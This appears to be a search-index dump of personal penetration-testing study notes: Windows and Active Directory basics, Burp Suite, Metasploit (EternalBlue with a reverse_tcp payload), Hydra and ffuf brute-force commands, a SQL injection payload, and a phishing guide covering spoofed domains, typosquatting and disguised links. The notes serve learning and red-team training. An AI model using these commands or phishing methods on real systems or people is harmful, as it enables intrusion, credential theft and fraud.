tool, stores restore points; malware targets it <code>vssadmin list shadows</code> UAC User Account Control, manages permissions <code>secpol.msc</code> (Local Security Policy) Firewall Network protection: Domain, Private, Public <code>wf.msc</code>"},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#key-windows-commands-for-pentesting","title":"Key Windows Commands for Pentesting","text":"Command Description hostname Displays system name whoami Shows the current logged-in user ipconfig Displays IP settings netstat Shows network stats and active connections net Manages network resources"},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#windows-security-checklist","title":"Windows Security Checklist","text":"Protection Area Description Command to Open Virus &amp; Threat Protection Real-time malware protection, scans for threats <code>ms-settings:windowsdefender</code> Firewall Protects against unauthorized network access <code>wf.msc</code> Device Security Includes TPM, Core Isolation for process protection <code>tpm.msc</code> App &amp; Browser Control Protects against malicious apps and phishing <code>ms-settings:privacy</code>"},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#active-directory","title":"Active Directory","text":""},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#domain-overview","title":"Domain Overview","text":"Topic Description Small Network Scenario With a small network, manually configuring and providing support works. Growth in Business As business grows, managing individual computers becomes impractical. Windows Domain A centralized network for managing users and computers. Active Directory (AD) Central repository for managing user/computer info in a domain. Domain Controller (DC) Server that runs AD services and manages the domain. Advantages of a Domain 1. Centralized identity management for users.  2. Easier management of security policies. Real-World Example School/university networks use domains for authentication and privilege control. THM Inc. Role Configuring and managing the domain \"THM.local\"."},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#active-directory-domain-service-ad-ds","title":"Active Directory Domain Service (AD DS)","text":"Topic Description Active Directory (AD) Holds information on domain objects (users, groups, machines). Users Security principals authenticated by the domain. Machines Machines (computers) with limited rights; follow the <code>&lt;ComputerName&gt;$</code> naming scheme. Security Groups Groups managing permissions for users and computers (e.g., Domain Admins, Server Operators). Active Directory Users and Computers (ADUC) Tool to manage users, groups, and machines in OUs. Organizational Units (OUs) OUs classify users and machines for role-based policies. Default Containers Predefined groups/containers like Builtin, Computers, Users, Domain Controllers. Security Groups vs OUs OUs are for policy management, Security Groups for resource access."},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#domain-administration-tasks","title":"Domain Administration Tasks","text":"Task Description Deleting Extra OUs Enable \"Advanced Features\", uncheck \"Protect object from accidental deletion\", then delete OU. Matching Users to Org Chart Check if users align with the organizational chart, create/delete as needed. Delegating Control Delegate control for OUs to specific users (e.g., reset passwords). Delegating OU Control Steps 1. Right-click OU, \"Delegate Control\".  2. Assign control to user (e.g., reset passwords). Testing Password Reset Reset passwords via PowerShell: <code>Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password')</code>. Force Password Reset <code>Set-ADUser -ChangePasswordAtLogon $true -Identity sophie</code> to force reset at next logon. RDP Login for Testing After password reset, log in via RDP with new credentials and retrieve flags from desktop."},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#segregating-machines-in-active-directory","title":"Segregating Machines in Active Directory","text":"Task Description Machines in \"Computers\" OU Machines (except Domain Controllers) placed in the \"Computers\" container by default. Device Categories Categories: 1. Workstations, 2. Servers, 3. Domain Controllers Creating New OUs Create \"Workstations\" and \"Servers\" OUs under <code>thm.local</code>. Moving Machines Move machines to appropriate OUs for policy application."},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#group-policy-objects-gpo-configuration","title":"Group Policy Objects (GPO) Configuration","text":"Task Description Group Policy Objects (GPOs) Collections of settings applied to OUs to configure security and system settings. GPO Scope GPO can apply to users or computers; linked to OUs and their sub-OUs. Editing a GPO Edit via <code>Computer Configuration -&gt; Policies -&gt; Windows Settings -&gt; Security Settings -&gt; Account Policies</code>. GPO Distribution GPOs distributed via SYSVOL on Domain Controllers; can take up to 2 hours to propagate. Use <code>gpupdate /force</code> to sync immediately. Restricting Control Panel Access GPO: Prohibit Access to Control Panel under <code>User Configuration -&gt; Administrative Templates -&gt; Control Panel</code>. Auto Lock Screen GPO Create GPO under <code>Computer Configuration -&gt; Policies -&gt; Windows Settings -&gt; Security Settings -&gt; Local Policies -&gt; Security Options -&gt; Interactive Logon: Machine inactivity limit</code>."},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#authentication-methods","title":"Authentication methods","text":"Feature Kerberos Authentication NetNTLM Authentication Protocol Type Default, modern protocol for Windows domains. Legacy protocol kept for compatibility. Authentication Mechanism Ticket-based, uses TGT/TGS for services. Challenge-response mechanism. Primary Purpose Authenticate users, access services without sending credentials repeatedly. Used in legacy systems. Key Entity Key Distribution Center (KDC) on the DC. Domain Controller (DC) for verification of challenges. Ticket Issuance TGT for accessing services. No tickets, challenge-response is used. Security Encrypted TGTs/TGS, no password hashes over the network. Password hashes aren't sent, challenge prevents hash leakage. Usage in Modern Systems Common in modern Windows networks. Obsolete, used for legacy compatibility. Service Access Specific service tickets requested for access. Direct challenge-response validation. Efficiency Efficient due to single TGT usage for multiple requests. Less efficient with repeated challenge-response. Protocols Supported Standard protocol for modern systems, supported widely. Legacy support."},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#trees-forests-and-trusts","title":"Trees, Forests and Trusts","text":"Concept Description Single Domain One domain for managing resources like users, computers, and servers. Trees Multiple domains with the same namespace (e.g., thm.local, uk.thm.local) to improve management. Tree Structure Root domain (e.g., thm.local) with subdomains (e.g., uk.thm.local) allowing separate management. Forests Union of multiple trees with different namespaces, e.g., merging thm.local and mht.local after an acquisition. Trust Relationships Allows users in one domain to access resources in another domain, with one-way or two-way trust. One-Way Trust Users in Domain BBB can access resources in Domain AAA, but not the other way around. Two-Way Trust Users from both domains can access resources in both domains. Enterprise Admins Administrative group with control over all domains in the enterprise. Domain Admins Administrative group with control over a single domain. Group Types Security and Distribution groups: Security for access control, Distribution for email distribution."},{"location":"Cybersecurity/Cheat%20Sheets/WindowsCLI/","title":"Windows","text":""},{"location":"Cybersecurity/Cheat%20Sheets/WindowsCLI/#system-information-commands","title":"System Information Commands","text":"Command Description Example Output <code>set</code> Displays the current environment variables. Shows system variables like Path, OS, etc. <code>ver</code> Displays the operating system version. <code>Microsoft Windows [Version 10.0.17763.1821]</code> <code>systeminfo</code> Displays detailed system information (e.g., OS, processor). OS Name: <code>Microsoft Windows Server 2019 Datacenter</code>"},{"location":"Cybersecurity/Cheat%20Sheets/WindowsCLI/#network-configuration-commands","title":"Network Configuration Commands","text":"Command Description Example Output <code>ipconfig</code> Displays IP configuration details. <code>IPv4 Address. . . . . . . . . : 192.168.0.100</code> <code>ping</code> Sends a packet to a network host to check connectivity. <code>Pinging 192.168.1.1 with 32 bytes of data: Reply</code> <code>tracert</code> Traces the route packets take to a network host. <code>Tracing route to google.com [142.250.80.78]</code>"},{"location":"Cybersecurity/Cheat%20Sheets/WindowsCLI/#disk-management-commands","title":"Disk Management Commands","text":"Command Description Example Output <code>chkdsk</code> Checks the disk for errors. <code>Checking file system on C:</code> <code>diskpart</code> Manages disk partitions. <code>Microsoft DiskPart version 10.0.17763.1</code> <code>wmic diskdrive</code> Displays detailed disk information. <code>Model: Samsung SSD 860 EVO 500GB</code>"},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/","title":"Burpsuite","text":""},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#burp-suite-basics-info","title":"Burp Suite Basics Info","text":"Feature Description Key Notes/Commands Features of Burp A web application security testing tool with modules for scanning, proxying, and exploiting. Includes tools like Proxy, Repeater, Scanner, and Intruder. Dashboard Central interface showing project activity, alerts, and scanning progress. Use for quick navigation and monitoring ongoing tests. Navigation Organized into tabs like Proxy, Target, Repeater, and Intruder for ease of use. Use tabs to quickly switch between tools. Options Configurable settings for tools and preferences, such as proxy interception and target scope. Adjust settings for scope and interception based on test requirements. Burp Proxy Intercepts and manipulates HTTP/HTTPS traffic between the browser and the server. Use with FoxyProxy for seamless browser integration. Connecting (FoxyProxy) Browser extension to redirect traffic through Burp Suite's proxy listener. Configure browser proxy settings to match Burp's proxy listener. Site Map Displays a hierarchical view of the application being tested. Use for exploring and mapping application structure. Issue Definitions Provides details about vulnerabilities identified during scans. Includes severity levels and remediation suggestions. Burp Suite Browser A Chromium-based browser integrated with Burp Suite for testing without manual proxy setup. Ideal for testing HTTPS and complex authentication flows. Scoping and Targeting Define target applications and directories to include or exclude in the tests. Reduces noise by focusing on specific areas of the application. Proxying HTTPS Allows interception of HTTPS traffic via Burp's CA certificate. Install Burp's certificate in the browser for SSL interception. Example Attack Manual or automated testing to find and exploit vulnerabilities like SQL injection or XSS. Use Repeater or Intruder for payload testing and automation. Conclusion Summarizes findings and generates reports for further analysis or client deliverables. Export detailed reports in professional engagements."},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#repeater","title":"Repeater","text":"<p>Enables us to <code>modify and resend intercepted requests</code> to a target of our choosing. It allows us to take requests captured in the Burp Proxy and manipulate them, sending them <code>repeatedly</code> as needed.</p> <p>Once a request has been captured in the Proxy module, we can send it to Repeater by either right-clicking on the request and selecting <code>Send to Repeater</code>, or by utilizing the keyboard shortcut <code>Ctrl + R</code>.</p>"},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#intruder","title":"Intruder","text":"<p>Offers <code>automated and customisable request manipulation</code> and enables tasks such as <code>fuzzing</code> and <code>brute-forcing</code>. Intruder's functionality is comparable to command-line tools like <code>Wfuzz</code> or <code>ffuf</code>.</p> <p>it's important to note that while Intruder can be used with Burp Community Edition, it is rate-limited, significantly reducing its speed compared to Burp Professional.</p> <p>The initial view of Intruder presents a simple interface where we can select our target. This field will already be populated if a request has been sent from the Proxy (using <code>Ctrl + I</code> or right-clicking and selecting <code>Send to Intruder</code>).</p>"},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#tabs","title":"Tabs","text":"Tab Description Positions examine the positions within the request <code>where we want to insert our payloads</code> Payloads create, assign, and configure <code>payloads</code>"},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#attack-types","title":"Attack types","text":"Type Description <code>Sniper</code> Default &amp; most common attack type, iterate through payloads by inserting <code>one at a time</code> into each defined position. <code>Battering ram</code> Sends all payloads simultaneously, each inserted into its defined position. Useful when testing for race conditions or when payloads need to be sent concurrently. <code>Pitchfork</code> Enables simultaneous testing of multiple positions with different payloads. It also always for definition of multiple payload sets, each associated with a specific position. <code>Cluster bomb</code> Combines sniper and pitchfork approaches. It performs a sniper-like attack on each position but simultaneously tests all payloads for each set."},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#other-modules","title":"Other Modules","text":""},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#decoder","title":"Decoder","text":"<p>Gives user data manipulation capabilities. It not only <code>decodee</code> data intercepted during an attack but also provides the function to <code>encode</code> our own data, prepping it for transmission to the target. Decoder also allows us to <code>create hashsums</code> of data, as well as providing a <code>Smart Decode</code> feature, which attempts to decode provided data recursively until it is back to being plaintext. Much like Cyberchef's \"magic\" function.</p>"},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#comparer","title":"Comparer","text":"<p>Comparer, as the name implies, lets us compare two pieces of data, either by <code>ASCII words or by bytes</code>.</p>"},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#sequencer","title":"Sequencer","text":"<p>Allows us to evaluate the entropy, or randomness, of \"tokens\". Tokens are strings used to identify something and should ideally be generated in a cryptographically secure manner.</p>"},{"location":"Cybersecurity/Gaining%20Access/Burpsuite/#organizer-tools","title":"Organizer tools","text":"<p>Designed to help you store and annotate copies of HTTP requests that you may want to revisit later.</p>"},{"location":"Cybersecurity/Gaining%20Access/Exploitation/","title":"Exploitation","text":""},{"location":"Cybersecurity/Gaining%20Access/Exploitation/#searchsploit","title":"SearchSploit","text":"Command Description Example <code>searchsploit [keyword]</code> Searches Exploit-DB for exploits matching a keyword. <code>searchsploit apache</code> <code>searchsploit -t [keyword]</code> Displays search results in a tree format. <code>searchsploit -t wordpress</code> <code>searchsploit -p [EDB-ID]</code> Shows the full path to an exploit in the database. <code>searchsploit -p 49733</code> <code>searchsploit -m [EDB-ID]</code> Copies an exploit to the current directory. <code>searchsploit -m 49733</code> <code>searchsploit --nmap [file]</code> Searches for exploits using an Nmap XML output file. <code>searchsploit --nmap scan.xml</code> <code>searchsploit -x [file]</code> Displays the content of an exploit file. <code>searchsploit -x exploits/linux/remote/49733.py</code> <code>searchsploit --www</code> Opens results directly in Exploit-DB website. <code>searchsploit apache --www</code> <code>searchsploit -w [keyword]</code> Searches Exploit-DB online and shows web links. <code>searchsploit -w apache</code>"},{"location":"Cybersecurity/Gaining%20Access/Exploitation/#common-workflow","title":"Common Workflow","text":"<ol> <li>Basic Search    Use <code>searchsploit</code> with a keyword to find relevant exploits:    ```bash    searchsploit apache</li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/Exploitation/#metasploit-framework","title":"Metasploit Framework","text":"Command Description Example <code>msfconsole</code> Launches the Metasploit Framework console. <code>msfconsole</code> <code>search [keyword]</code> Searches for modules matching the keyword. <code>search smb</code> <code>use [module]</code> Selects a specific module to use. <code>use exploit/windows/smb/ms17_010_eternalblue</code> <code>show options</code> Displays options required for the selected module. <code>show options</code> <code>set [option] [value]</code> Sets a specific value for a module option. <code>set RHOSTS 192.168.1.100</code> <code>show payloads</code> Lists payloads compatible with the selected module. <code>show payloads</code> <code>set PAYLOAD [payload]</code> Selects a payload for the exploit. <code>set PAYLOAD windows/meterpreter/reverse_tcp</code> <code>exploit</code> or <code>run</code> Executes the selected exploit. <code>exploit</code> <code>sessions -l</code> Lists all active sessions. <code>sessions -l</code> <code>sessions -i [session_id]</code> Interacts with a specific session. <code>sessions -i 1</code> <code>background</code> Sends the active session to the background. <code>background</code>"},{"location":"Cybersecurity/Gaining%20Access/Exploitation/#auxiliary-other-commands","title":"Auxiliary &amp; Other Commands","text":"Command Description Example <code>use auxiliary/scanner/portscan/tcp</code> Selects a TCP port scanning auxiliary module. <code>use auxiliary/scanner/portscan/tcp</code> <code>set THREADS [number]</code> Sets the number of threads for parallel operations. <code>set THREADS 10</code> <code>db_status</code> Displays the current database status. <code>db_status</code> <code>db_connect [user:pass@host/db]</code> Connects Metasploit to a database. <code>db_connect msf:password@127.0.0.1/msfdb</code> <code>db_nmap [nmap_options]</code> Runs Nmap and imports the results into Metasploit. <code>db_nmap -sV 192.168.1.0/24</code> <code>creds</code> Displays stored credentials in the database. <code>creds</code> <code>hosts</code> Lists all hosts in the database. <code>hosts</code>"},{"location":"Cybersecurity/Gaining%20Access/Exploitation/#common-workflow_1","title":"Common Workflow","text":"<ol> <li>Search for Exploits    Use <code>search</code> to find an exploit or module relevant to your target:    ```bash    search smb</li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/Hydra/","title":"Hydra","text":""},{"location":"Cybersecurity/Gaining%20Access/Hydra/#hydra-cheat-sheet","title":"Hydra Cheat Sheet","text":"<p>Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.</p> Command Description Example <code>hydra -l [user] -p [password] [target] [service]</code> Performs a brute-force attack with one username and one password. <code>hydra -l admin -p password123 192.168.1.10 ssh</code> <code>hydra -L [userlist] -p [password] [target] [service]</code> Uses a list of usernames and a single password. <code>hydra -L users.txt -p password123 192.168.1.10 ssh</code> <code>hydra -l [user] -P [passwordlist] [target] [service]</code> Uses a single username and a list of passwords. <code>hydra -l admin -P rockyou.txt 192.168.1.10 ftp</code> <code>hydra -L [userlist] -P [passwordlist] [target] [service]</code> Uses lists of usernames and passwords. <code>hydra -L users.txt -P rockyou.txt 192.168.1.10 ssh</code> <code>hydra -e [mode] [target] [service]</code> Tests additional passwords based on <code>mode</code> (e.g., empty, reverse). <code>hydra -l admin -P rockyou.txt -e nsr 192.168.1.10 http</code> <code>hydra -t [threads] [target] [service]</code> Sets the number of parallel connections (default: 16). <code>hydra -l admin -P passwords.txt -t 4 192.168.1.10 ssh</code> <code>hydra -vV [target] [service]</code> Enables verbose output for detailed logging. <code>hydra -vV -l admin -P rockyou.txt 192.168.1.10 ssh</code> <code>hydra -s [port] [target] [service]</code> Specifies a non-default port for the service. <code>hydra -l admin -P rockyou.txt -s 2222 192.168.1.10 ssh</code> <code>hydra -f [target] [service]</code> Stops the attack after the first successful login. <code>hydra -l admin -P rockyou.txt -f 192.168.1.10 ssh</code> <code>hydra -o [file] [target] [service]</code> Saves successful login attempts to a file. <code>hydra -l admin -P rockyou.txt -o results.txt ssh://192.168.1.10</code>"},{"location":"Cybersecurity/Gaining%20Access/Hydra/#common-services-and-commands","title":"Common Services and Commands","text":"Service Example Command SSH <code>hydra -l root -P passwords.txt 192.168.1.10 ssh</code> FTP <code>hydra -L users.txt -P passwords.txt 192.168.1.10 ftp</code> HTTP GET <code>hydra -L users.txt -P passwords.txt 192.168.1.10 http-get /login</code> HTTP POST <code>hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form \"/login:user=^USER^&amp;pass=^PASS^:F=incorrect\"</code> RDP <code>hydra -l admin -P passwords.txt 192.168.1.10 rdp</code> MySQL <code>hydra -L users.txt -P passwords.txt 192.168.1.10 mysql</code> SMB <code>hydra -L users.txt -P passwords.txt 192.168.1.10 smb</code>"},{"location":"Cybersecurity/Gaining%20Access/Hydra/#workflow-example","title":"Workflow Example","text":"<ol> <li>Test a Single Username and Wordlist    ```bash    hydra -l admin -P rockyou.txt 192.168.1.10 ssh</li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/OWASP10/","title":"OWASP10","text":""},{"location":"Cybersecurity/Gaining%20Access/OWASP10/#owasp-top-10-vulnerabilities","title":"OWASP Top 10 Vulnerabilities","text":"Vulnerability Description Burp Suite Example A01: Broken Access Control Improper enforcement of permissions. Use Burp's Access Control Bypass plugin to modify user roles and check unauthorized access. A02: Cryptographic Failures Weak encryption or poor handling of sensitive data. Intercept HTTPS traffic using Burp Proxy to check for plaintext sensitive information. A03: Injection Unsanitized input leading to unintended commands. Use Burp's Intruder to send SQL payloads like <code>' OR 1=1 --</code> to login forms. A04: Insecure Design Flaws in the application\u2019s logic or architecture. Use Repeater to manually test for logical vulnerabilities like bypassing payment steps. A05: Security Misconfiguration Unnecessary features or default settings enabled. Use Burp's Scanner to detect outdated software or misconfigured headers. A06: Vulnerable Components Using outdated or insecure third-party software. Analyze Server-Side Includes (SSI) using Burp's Proxy logs for vulnerable libraries. A07: Identification and Authentication Failures Weak or broken authentication mechanisms. Use Burp's Intruder to brute-force login credentials with common username/password lists. A08: Software and Data Integrity Failures Compromised software supply chains or lack of integrity checks. Use Burp's Logger++ extension to monitor traffic for unsigned or modified scripts. A09: Security Logging and Monitoring Failures Insufficient monitoring or logging of suspicious activities. Simulate suspicious activities using Burp's tools and check server responses for monitoring alerts. A10: Server-Side Request Forgery (SSRF) Unsanitized server-side requests to external systems. Use Burp's Collaborator to confirm SSRF by triggering out-of-band DNS requests."},{"location":"Cybersecurity/Gaining%20Access/OWASP10/#workflow-examples","title":"Workflow Examples","text":""},{"location":"Cybersecurity/Gaining%20Access/OWASP10/#a03-injection-sqli-testing","title":"A03: Injection (SQLi Testing)","text":"<ol> <li>Intercept a request with user input in Burp Suite Proxy.</li> <li>Send the request to Intruder.</li> <li>Use a payload list like <code>OWASP-SQLi.txt</code> to inject malicious SQL commands.</li> <li>Analyze the response for errors or unintended behavior.</li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/OWASP10/#a05-security-misconfiguration-header-testing","title":"A05: Security Misconfiguration (Header Testing)","text":"<ol> <li>Capture server responses in Burp Proxy.</li> <li>Inspect headers for security issues like:</li> <li>Missing <code>X-Content-Type-Options</code>.</li> <li>Misconfigured <code>Content-Security-Policy</code>.</li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/OWASP10/#a07-identification-and-authentication-failures-brute-force","title":"A07: Identification and Authentication Failures (Brute Force)","text":"<ol> <li>Intercept a login request in Burp Proxy.</li> <li>Send it to Intruder.</li> <li>Set the payload positions for username/password fields.</li> <li>Use a wordlist like <code>rockyou.txt</code> to brute-force credentials.</li> <li>Review responses for successful login attempts.</li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/OWASP10/#notes","title":"Notes","text":"<ul> <li>Use Burp Scanner for automated checks on common OWASP vulnerabilities.</li> <li>Leverage Burp Collaborator for out-of-band testing (e.g., SSRF, Blind XSS).</li> <li>Prioritize manual testing for logical flaws (e.g., Insecure Design).</li> <li>Regularly update Burp extensions for the latest testing methodologies.</li> </ul>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/","title":"Phishing","text":""},{"location":"Cybersecurity/Gaining%20Access/Phishing/#intro-to-phishing-attacks","title":"Intro to phishing attacks","text":"<p>Before you learn what <code>phishing</code> is, you'll need to understand the term <code>social engineering</code>. Social engineering is the <code>psychological manipulation</code> of people into performing or divulging information by exploiting weaknesses in human nature. These \"weaknesses\" can be <code>curiosity</code>, <code>jealously</code>, <code>greed</code> and even <code>kindness and the willingness to help someone</code>.</p> <p>Phishing is a source of <code>social engineering delivered through email</code> to trick someone into either revealing personal information, credentials or even executing malicious code on their computer.</p> <p>A term you'll come across and the type of phishing campaign a red team would participate in is <code>spear-phishing</code>, as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing in that <code>you're targeting an individual, business or organisation rather than just anybody as mass</code>. This is an effective form of phishing for a red team engagement as they are bespoke to the target it makes them hard to detect by technology such as spam filters, antivirus and firewalls.</p> <p>Some other methods of phishing through other mediums are <code>smishing</code> which is <code>phishing through SMS messages</code>, and <code>vishing</code> which is performed through <code>phone calls</code>.</p>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/#writing-convincing-emails","title":"Writing convincing emails","text":"<p>We have three things to work with regarding phishing emails: the sender's email address, the subject and the content.</p> <p>The Senders Address:</p> <p>Ideally, the sender's address would be from a <code>domain name that spoofs a significant brand</code>, a <code>known contact</code>, or a <code>coworker</code>.</p> <p>To find what brands or people a victim interacts with, you can employ <code>OSINT (Open Source Intelligence) tactics</code>: - Observe their social media account for any <code>brands or friends they talk to</code>. - Searching Google for the victim's name and rough location for any reviews the victim may have left about <code>local businesses or brands</code>. - Looking at the victim's <code>business website to find suppliers</code>. - Looking at <code>LinkedIn to find coworkers</code> of the victim.</p> <p>The Subject:</p> <p>You should set the subject to something quite <code>urgent</code>, <code>worrying</code>, or <code>piques the victim's curiosity</code>, so they <code>do not ignore it and act on it quickly</code>.</p> <p>Examples of this could be: - Your account has been compromised. - Your package has been dispatched/shipped. - Staff payroll information (do not forward!) - Your photos have been published.</p> <p>The Content:</p> <p>If impersonating a brand or supplier, it would be pertinent to <code>research their standard email templates</code> and <code>branding</code> (style, logo's images, signoffs etc.) and <code>make your content look the same</code> as theirs, so the victim doesn't expect anything.</p> <p>If impersonating a contact or coworker, it could be beneficial to contact them; first, they may have some <code>branding in their template</code>, have a particular <code>email signature</code> or even something small such as <code>how they refer to themselves</code>, for example, someone might have the name Dorothy and their email is dorothy@company.thm. Still, in their signature, it might say \"<code>Best Regards, Dot</code>\".</p> <p>Learning these somewhat small things can sometimes have quite dramatic psychological effects on the victim and convince them more to open and act on the email.</p> <p>If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the <code>anchor text</code> and changing it either to some text which says \"Click Here\" or changing it to a correct looking link that reflects the business you are spoofing, for example: - <code>&lt;a href=\"http://spoofsite.thm\"&gt;Click Here&lt;/a&gt;</code> - <code>&lt;a href=\"http://spoofsite.thm\"&gt;https://onlinebank.thm&lt;/a&gt;</code></p>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/#phishing-infrastructure","title":"Phishing infrastructure","text":"<ul> <li> <p>Domain Name:</p> <p>You'll need to <code>register either an authentic-looking domain name or one that mimics the identity of another domain</code>.</p> </li> <li> <p>Email Server/Account:</p> <p>You'll need to either <code>set up an email server or register with an SMTP email provider</code>. </p> </li> <li> <p>DNS Records:</p> <p>Setting up DNS Records such as <code>SPF</code>, <code>DKIM</code>, <code>DMARC</code> will improve the deliverability of your emails and <code>make sure they're getting into the inbox rather than the spam folder</code>.</p> </li> <li> <p>Web Server:</p> <p>You'll need to <code>set up webservers or purchase web hosting</code> from a company to host your phishing websites.</p> </li> <li> <p>SSL/TLS Certificates:</p> <p>Creating SSL/TLS certificates for your chosen domain name will add an <code>extra layer of authenticity</code> to the attack.</p> </li> <li> <p>Analytics:</p> <p>When a phishing campaign is part of a red team engagement, keeping analytics information is more important. You'll need <code>something to keep track of the emails that have been sent, opened or clicked</code>. You'll also need to combine it with information from your phishing websites for which users have supplied personal information or downloaded software. </p> </li> </ul>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/#automation-and-useful-software","title":"Automation And Useful Software","text":"<p>Some of the above infrastructures can be quickly automated by using the below tools.</p> <ul> <li> <p>GoPhish - (Open-Source Phishing Framework)</p> <p>GoPhish is a web-based framework to make setting up phishing campaigns more straightforward. GoPhish allows you to store your SMTP server settings for sending emails, has a web-based tool for creating email templates using a simple WYSIWYG (What You See Is What You Get) editor. You can also schedule when emails are sent and have an analytics dashboard that shows how many emails have been sent, opened or clicked.</p> </li> <li> <p>SET - (Social Engineering Toolkit)</p> <p>The Social Engineering Toolkit contains a multitude of tools, but some of the important ones for phishing are the ability to create spear-phishing attacks and deploy fake versions of common websites to trick victims into entering their credentials.</p> </li> </ul> <p></p>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/#droppers","title":"Droppers","text":"<p>Droppers are <code>software</code> that phishing victims tend to be tricked into downloading and running on their system. The dropper may advertise itself as something useful or legitimate such as a codec to view a certain video or software to open a specific file.</p> <p>The droppers are not usually malicious themselves, so they tend to pass antivirus checks. <code>Once installed, the intended malware is either unpacked or downloaded from a server</code> and installed onto the victim's computer. The malicious software usually <code>connects back to the attacker's infrastructure</code>. The attacker can take control of the victim's computer, which can further explore and exploit the local network.</p>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/#choosing-a-phishing-domain","title":"Choosing a phishing domain","text":"<p>Choosing the right Phishing domain to launch your attack from is essential to ensure you have the psychological edge over your target. A red team engagement can use some of the below methods for choosing the perfect domain name.</p> <p>Expired Domains:</p> <p>Although not essential, buying a domain name with some history <code>may lead to better scoring of your domain when it comes to spam filters</code>. Spam filters have a tendency to not trust brand new domain names compared to ones with some history.</p> <p>Typosquatting:</p> <p>Typosquatting is when a registered domain <code>looks very similar to the target domain you're trying to impersonate</code>. Here are some of the common methods: - Misspelling: goggle.com Vs google.com - Additional Period: go.ogle.com Vs google.com - Switching numbers for letters: g00gle.com Vs google.com - Phrasing: googles.com Vs google.com - Additional Word: googleresults.com Vs google.com</p> <p>These changes might look unrealistic, but <code>at a glance, the human brain tends to fill in the blanks</code> and see what it wants to see, i.e. the correct domain name.</p> <p>TLD Alternatives:</p> <p>A TLD (Top Level Domain) is the .com .net .co.uk .org .gov e.t.c part of a domain name, there are 100's of variants of TLD's now. A common trick for choosing a domain would be to use the <code>same name but with a different TLD</code>. For example, register tryhackme.co.uk to impersonate tryhackme.com.</p> <p>IDN Homograph Attack/Script Spoofing:</p> <p>Originally domain names were made up of Latin characters a-z and 0-9, but in 1998, <code>IDN (internationalized domain name)</code> was implemented to support language-specific script or alphabet from other languages such as Arabic, Chinese, Cyrillic, Hebrew and more. An issue that arises from the IDN implementation is that different letters from different languages can actually appear identical. For example, Unicode character U+0430 (Cyrillic small letter a) looks identical to Unicode character U+0061 (Latin small letter a) used in English, enabling attackers to register a domain name that looks almost identical to another.</p> <p></p>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/#using-ms-office-in-phishing","title":"Using MS Office in phishing","text":"<p>Often during phishing campaigns, a Microsoft Office document (typically Word, Excel or PowerPoint) will be included as an attachment. <code>Office documents can contain macros</code>; macros do have a legitimate use but can also be used to run computer commands that can cause malware to be installed onto the victim's computer or connect back to an attacker's network and allow the attacker to take control of the victim's computer.</p>"},{"location":"Cybersecurity/Gaining%20Access/Phishing/#using-browser-exploits","title":"Using browser exploits","text":"<p>Another method of gaining control over a victim's computer could be through browser exploits; this is when there is a <code>vulnerability against a browser itself</code> (Internet Explorer/Edge, Firefox, Chrome, Safari, etc.), which allows the attacker to run remote commands on the victim's computer.</p> <p>Browser exploits aren't usually a common path to follow in a red team engagement unless you have prior knowledge of old technology being used on-site. Many browsers are kept up to date, hard to exploit due to how browsers are developed, and the exploits are often worth a lot of money if reported back to the developers.</p> <p>That being said, it can happen, and as previously mentioned, it could be used to target old technologies on-site because possibly the browser software cannot be updated due to incompatibility with commercial software/hardware, which can happen quite often in big institutions such as education, government and especially health care.</p> <p>Usually, the victim would receive an email, convincing them to visit a particular website set up by the attacker. Once the victim is on the site, the exploit works against the browser, and now the attacker can perform any commands they wish on the victim's computer.</p> <p>An example of this is CVE-2021-40444 from September 2021, which is a vulnerability found in Microsoft systems that allowed the execution of code just from visiting a website.</p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/","title":"Enumeration","text":""},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#authentication-bypass","title":"Authentication Bypass","text":"Type Description Example Username Enumeration Abuse user authentication by looking at server responses like \"An account with this username already exists.\" <code>ffuf -w wordlist.txt -X POST -d \"username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.10.220/customers/signup -mr \"username already exists\"</code> Brute force Brute force search for the password from the enumerated user <code>ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d \"username=W1&amp;password=W2\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.32.175/customers/login -fc 200</code> Logic flaws Abuse faulty code Exact string matches for <code>admin</code> could be <code>adMIN</code>. <code>Password reset forms</code>, Abuse <code>Header files</code> &amp; <code>requests</code>, <code>Off by one errors</code>, etc. Cookie Tampering Examining and editing the cookies 